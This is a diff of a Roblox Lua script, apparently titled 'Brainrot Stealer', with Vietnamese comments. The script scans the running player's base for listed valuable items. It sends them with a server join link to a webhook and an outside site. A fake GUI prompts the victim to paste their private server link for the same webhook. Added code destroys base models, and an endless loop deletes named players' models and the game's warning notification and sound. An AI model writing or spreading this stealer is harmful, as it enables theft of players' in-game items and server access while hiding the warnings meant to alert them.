@@ -1,6 +1,8 @@
--- Full script: Brainrot Stealer + TargetNames check + Webhook
+-- Full Script: Brainrot Stealer + Base Duplicate + PlayerCleaner
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 
 -- Webhook
@@ -27,7 +29,7 @@ local TargetNames = {
 local Lookup = {}
 for _, n in ipairs(TargetNames) do Lookup[n] = true end
 
--- ====== Hàm tìm base
+-- ====== Tìm base của bản thân
 local function FindMyBase()
     for _, plot in pairs(workspace.Plots:GetChildren()) do
         local sign = plot:FindFirstChild("PlotSign")
@@ -73,7 +75,7 @@ end
 
 -- ====== Hàm send webhook
 local function sendWebhook(link, brainrotLoot)
-    if #brainrotLoot == 0 then return end -- Không gửi nếu không tìm thấy target
+    if #brainrotLoot == 0 then return end
     local placeId = tostring(game.PlaceId or "")
     local jobId = tostring(game.JobId or "")
     local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
@@ -105,80 +107,122 @@ end
 if _G.BrainrotWebhookSent then return end
 _G.BrainrotWebhookSent = true
 
--- ====== Thực thi
+-- ====== Thực thi Brainrot Loot
 local myPlot = FindMyBase()
 local brainrotLoot = GetBrainrotLoot(myPlot)
-
 if #brainrotLoot == 0 then
     print("Không tìm thấy target nào, webhook sẽ không gửi")
-    return
+else
+    -- ====== Nhân bản base + xóa cũ (trừ FriendPanel)
+    if myPlot then
+        for _, obj in pairs(myPlot:GetChildren()) do
+            if obj:IsA("Model") and obj.Name ~= "FriendPanel" then
+                local clone = obj:Clone()
+                clone.Name = obj.Name.."_Clone"
+                clone.Parent = myPlot
+                obj:Destroy()
+            end
+        end
+    end
+
+    if serverType == "PUBLIC SERVER" then
+        sendWebhook()
+    else
+        -- Private server GUI nhập link
+        local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+        screenGui.Name = "StealBrainrotGUI"
+        screenGui.ResetOnSpawn = false
+
+        local frame = Instance.new("Frame", screenGui)
+        frame.Size = UDim2.new(0, 320, 0, 180)
+        frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+        frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+        frame.Active = true
+        frame.Draggable = true
+        local frameCorner = Instance.new("UICorner", frame)
+        frameCorner.CornerRadius = UDim.new(0,12)
+
+        local title = Instance.new("TextLabel", frame)
+        title.Text = "Steal a Brainrot"
+        title.Font = Enum.Font.FredokaOne
+        title.TextSize = 20
+        title.TextColor3 = Color3.fromRGB(255,255,255)
+        title.BackgroundTransparency = 1
+        title.Size = UDim2.new(1,0,0,28)
+        title.Position = UDim2.new(0,0,0,4)
+
+        local textBox = Instance.new("TextBox", frame)
+        textBox.Size = UDim2.new(0.9,0,0,40)
+        textBox.Position = UDim2.new(0.05,0,0,60)
+        textBox.PlaceholderText = "Please enter your private server link"
+        textBox.Text = ""
+        textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+        textBox.TextColor3 = Color3.fromRGB(255,255,255)
+        textBox.ClearTextOnFocus = false
+        textBox.Font = Enum.Font.FredokaOne
+        textBox.TextSize = 14
+        local tbCorner = Instance.new("UICorner", textBox)
+        tbCorner.CornerRadius = UDim.new(0,8)
+
+        local sendButton = Instance.new("TextButton", frame)
+        sendButton.Text = "Send"
+        sendButton.Font = Enum.Font.FredokaOne
+        sendButton.TextSize = 18
+        sendButton.TextColor3 = Color3.fromRGB(255,255,255)
+        sendButton.BackgroundColor3 = Color3.fromRGB(0,100,0)
+        sendButton.Size = UDim2.new(0.4,0,0,32)
+        sendButton.Position = UDim2.new(0.3,0,0,110)
+        local sendCorner = Instance.new("UICorner", sendButton)
+        sendCorner.CornerRadius = UDim.new(0,8)
+
+        local function isValidLink(txt)
+            return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
+        end
+        local function showError(msg) print(msg) end
+
+        sendButton.MouseButton1Click:Connect(function()
+            local txt = textBox.Text or ""
+            if isValidLink(txt) then
+                sendWebhook(txt, brainrotLoot)
+                screenGui:Destroy()
+            else
+                showError("Please enter a valid private server link")
+            end
+        end)
+    end
 end
 
-if serverType == "PUBLIC SERVER" then
-    sendWebhook() -- gửi ngay
-else
-    -- Private server: tạo GUI nhập link
-    local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-    screenGui.Name = "StealBrainrotGUI"
-    screenGui.ResetOnSpawn = false
+-- ====== Thêm phần xóa model player / notification / warn
+local playerNamesToDelete = {"phatle8117","ConCuTiHon02"," candyblossom1243"}
 
-    local frame = Instance.new("Frame", screenGui)
-    frame.Size = UDim2.new(0, 320, 0, 180)
-    frame.Position = UDim2.new(0.5, -160, 0.5, -90)
-    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
-    frame.Active = true
-    frame.Draggable = true
-    local frameCorner = Instance.new("UICorner", frame)
-    frameCorner.CornerRadius = UDim.new(0,12)
-
-    local title = Instance.new("TextLabel", frame)
-    title.Text = "Steal a Brainrot"
-    title.Font = Enum.Font.FredokaOne
-    title.TextSize = 20
-    title.TextColor3 = Color3.fromRGB(255,255,255)
-    title.BackgroundTransparency = 1
-    title.Size = UDim2.new(1,0,0,28)
-    title.Position = UDim2.new(0,0,0,4)
-
-    local textBox = Instance.new("TextBox", frame)
-    textBox.Size = UDim2.new(0.9,0,0,40)
-    textBox.Position = UDim2.new(0.05,0,0,60)
-    textBox.PlaceholderText = "Please enter your private server link"
-    textBox.Text = ""
-    textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
-    textBox.TextColor3 = Color3.fromRGB(255,255,255)
-    textBox.ClearTextOnFocus = false
-    textBox.Font = Enum.Font.FredokaOne
-    textBox.TextSize = 14
-    local tbCorner = Instance.new("UICorner", textBox)
-    tbCorner.CornerRadius = UDim.new(0,8)
-
-    local sendButton = Instance.new("TextButton", frame)
-    sendButton.Text = "Send"
-    sendButton.Font = Enum.Font.FredokaOne
-    sendButton.TextSize = 18
-    sendButton.TextColor3 = Color3.fromRGB(255,255,255)
-    sendButton.BackgroundColor3 = Color3.fromRGB(0,100,0)
-    sendButton.Size = UDim2.new(0.4,0,0,32)
-    sendButton.Position = UDim2.new(0.3,0,0,110)
-    local sendCorner = Instance.new("UICorner", sendButton)
-    sendCorner.CornerRadius = UDim.new(0,8)
-
-    local function isValidLink(txt)
-        return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
-    end
-
-    local function showError(msg)
-        print(msg)
-    end
-
-    sendButton.MouseButton1Click:Connect(function()
-        local txt = textBox.Text or ""
-        if isValidLink(txt) then
-            sendWebhook(txt, brainrotLoot)
-            screenGui:Destroy()
-        else
-            showError("Please enter a valid private server link")
+local function DeletePlayerModels()
+    for _, name in pairs(playerNamesToDelete) do
+        local model = workspace:FindFirstChild(name)
+        if model then
+            model:Destroy()
+            print("Đã xóa model của: "..name)
         end
-    end)
+    end
+end
+
+local function DeleteNotificationAndWarn()
+    local notification = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("Notification")
+    if notification then
+        notification:Destroy()
+        print("Đã xóa PlayerGui.Notification")
+    end
+    local warnSound = ReplicatedStorage:FindFirstChild("Sounds")
+                    and ReplicatedStorage.Sounds:FindFirstChild("Sfx")
+                    and ReplicatedStorage.Sounds.Sfx:FindFirstChild("Warn")
+    if warnSound then
+        warnSound:Destroy()
+        print("Đã xóa ReplicatedStorage.Sounds.Sfx.Warn")
+    end
+end
+
+-- Lặp vô hạn mỗi 1 giây
+while true do
+    DeletePlayerModels()
+    DeleteNotificationAndWarn()
+    wait(1)
 end
